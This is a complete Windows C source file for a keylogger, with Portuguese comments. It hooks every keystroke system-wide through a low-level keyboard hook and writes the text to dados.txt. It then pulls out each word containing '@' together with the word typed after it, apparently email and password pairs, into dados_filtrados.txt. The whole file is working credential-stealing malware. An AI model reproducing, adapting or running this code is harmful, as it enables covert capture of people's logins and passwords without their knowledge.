#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <locale.h>
#include <wctype.h>
#include <wchar.h>

HHOOK hKeyboardHook;

// Função auxiliar para resolver o problema de Dead Keys (Acentos) no Windows
int GetUnicodeCharFromHook(KBDLLHOOKSTRUCT *pKeyBoard, WCHAR *buffer) {

    BYTE keystate[256] = {0};

    if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
        keystate[VK_SHIFT] = 0x80;

    if (GetKeyState(VK_CAPITAL) & 0x0001)
        keystate[VK_CAPITAL] = 0x01;

    if (GetAsyncKeyState(VK_MENU) & 0x8000)
        keystate[VK_MENU] = 0x80;

    if (GetAsyncKeyState(VK_CONTROL) & 0x8000)
        keystate[VK_CONTROL] = 0x80;

    DWORD threadId = GetWindowThreadProcessId(
        GetForegroundWindow(),
        NULL
    );

    HKL layout = GetKeyboardLayout(threadId);

    int result = ToUnicodeEx(
        pKeyBoard->vkCode,
        pKeyBoard->scanCode,
        keystate,
        buffer,
        5,
        0,
        layout
    );

    // limpa dead key
    if (result == -1) {

        WCHAR tempBuf[5];

        ToUnicodeEx(
            VK_SPACE,
            MapVirtualKeyW(VK_SPACE, MAPVK_VK_TO_VSC),
            keystate,
            tempBuf,
            5,
            0,
            layout
        );
    }

    return result;
}

// Atualiza dados_filtrados.txt
void AtualizarArquivoFiltrado() {

    FILE *arqvOrigem = _wfopen(
        L"dados.txt",
        L"r, ccs=UTF-8"
    );

    if (arqvOrigem == NULL)
        return;

    size_t bufSize = 65536;

    wchar_t *conteudo = (wchar_t *)malloc(
        bufSize * sizeof(wchar_t)
    );

    if (conteudo == NULL) {
        fclose(arqvOrigem);
        return;
    }

    size_t totalLidos = 0;
    wchar_t ch;

    while (
        (ch = fgetwc(arqvOrigem)) != WEOF &&
        totalLidos < bufSize - 1
    ) {
        conteudo[totalLidos++] = ch;
    }

    conteudo[totalLidos] = L'\0';

    fclose(arqvOrigem);

    FILE *arqvDestino = _wfopen(
        L"dados_filtrados.txt",
        L"w, ccs=UTF-8"
    );

    if (arqvDestino == NULL) {
        free(conteudo);
        return;
    }

    wchar_t *p = conteudo;

    while (*p != L'\0') {

        // pula espaços
        while (
            *p == L' '  ||
            *p == L'\n' ||
            *p == L'\r' ||
            *p == L'\t'
        ) {
            p++;
        }

        if (*p == L'\0')
            break;

        // início da primeira palavra
        wchar_t *inicio1 = p;

        while (
            *p != L'\0' &&
            *p != L' '  &&
            *p != L'\n' &&
            *p != L'\r' &&
            *p != L'\t'
        ) {
            p++;
        }

        wchar_t *fim1 = p;

        size_t len1 = fim1 - inicio1;

        // copia palavra atual
        wchar_t palavra1[512];

        wcsncpy(palavra1, inicio1, len1);

        palavra1[len1] = L'\0';

        if (palavra1[0] == L't') {
          memmove(
              palavra1,
              palavra1 + 1,
              wcslen(palavra1) * sizeof(wchar_t)
              );
        }

        // verifica se contém '@'
        if (wcschr(palavra1, L'@') != NULL) {

            // pula separadores
            while (
                *p == L' '  ||
                *p == L'\n' ||
                *p == L'\r' ||
                *p == L'\t'
            ) {
                p++;
            }

            // existe próxima palavra?
            if (*p != L'\0') {

                wchar_t *inicio2 = p;

                while (
                    *p != L'\0' &&
                    *p != L' '  &&
                    *p != L'\n' &&
                    *p != L'\r' &&
                    *p != L'\t'
                ) {
                    p++;
                }

                wchar_t *fim2 = p;

                size_t len2 = fim2 - inicio2;

                fwprintf(
                    arqvDestino,
                    L"[%ls][%.*ls]\n",
                    palavra1,
                    (int)len2,
                    inicio2
                );
            }
        }
    }

    fclose(arqvDestino);

    free(conteudo);
}

LRESULT CALLBACK KeyboardProc(
    int nCode,
    WPARAM wParam,
    LPARAM lParam
) {

    if (
        nCode >= 0 &&
        (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
    ) {

        KBDLLHOOKSTRUCT *pKeyBoard =
            (KBDLLHOOKSTRUCT *)lParam;

        DWORD vkCode = pKeyBoard->vkCode;

        // BACKSPACE
        if (vkCode == VK_BACK) {

            FILE *arquivoLeitura = _wfopen(
                L"dados.txt",
                L"r, ccs=UTF-8"
            );

            if (arquivoLeitura != NULL) {

                size_t bufferSize = 65536;

                wchar_t *texto = (wchar_t *)malloc(
                    bufferSize * sizeof(wchar_t)
                );

                size_t totalLidos = 0;
                wchar_t ch;

                while (
                    (ch = fgetwc(arquivoLeitura)) != WEOF &&
                    totalLidos < bufferSize - 1
                ) {
                    texto[totalLidos++] = ch;
                }

                texto[totalLidos] = L'\0';

                fclose(arquivoLeitura);

                if (totalLidos > 0) {

                    texto[totalLidos - 1] = L'\0';

                    FILE *arquivoEscrita = _wfopen(
                        L"dados.txt",
                        L"w, ccs=UTF-8"
                    );

                    if (arquivoEscrita != NULL) {

                        fputws(texto, arquivoEscrita);

                        fclose(arquivoEscrita);
                    }
                }

                free(texto);
            }

            AtualizarArquivoFiltrado();

            return CallNextHookEx(
                hKeyboardHook,
                nCode,
                wParam,
                lParam
            );
        }

        // OUTROS CARACTERES
        WCHAR unicodeBuffer[5] = {0};

        int translationResult =
            GetUnicodeCharFromHook(
                pKeyBoard,
                unicodeBuffer
            );

        FILE *arquivo = _wfopen(
            L"dados.txt",
            L"a, ccs=UTF-8"
        );

        if (arquivo != NULL) {

            if (translationResult > 0) {

                for (
                    int i = 0;
                    i < translationResult;
                    i++
                ) {

                    if (
                        unicodeBuffer[i] >= 32 ||
                        unicodeBuffer[i] == L'\n' ||
                        unicodeBuffer[i] == L'\r'
                    ) {

                        fputwc(
                            unicodeBuffer[i],
                            arquivo
                        );
                    }
                }
            }
            else if (translationResult == 0) {

                if (vkCode == VK_RETURN) {

                    fwprintf(arquivo, L"\n");
                }
                else if (vkCode == VK_TAB) {

                    fwprintf(arquivo, L"\t");
                }
            }

            fclose(arquivo);

            AtualizarArquivoFiltrado();
        }
    }

    return CallNextHookEx(
        hKeyboardHook,
        nCode,
        wParam,
        lParam
    );
}

int main() {

    setlocale(LC_ALL, "");

    hKeyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,
        KeyboardProc,
        NULL,
        0
    );

    if (hKeyboardHook == NULL) {

        printf("Erro ao instalar o hook!\n");

        return 1;
    }

    printf(
        "Monitoramento iniciado.\n"
        "dados.txt -> bruto\n"
        "dados_filtrados.txt -> filtrado\n"
    );

    MSG msg;

    while (GetMessage(&msg, NULL, 0, 0)) {

        TranslateMessage(&msg);

        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hKeyboardHook);

    return 0;
}
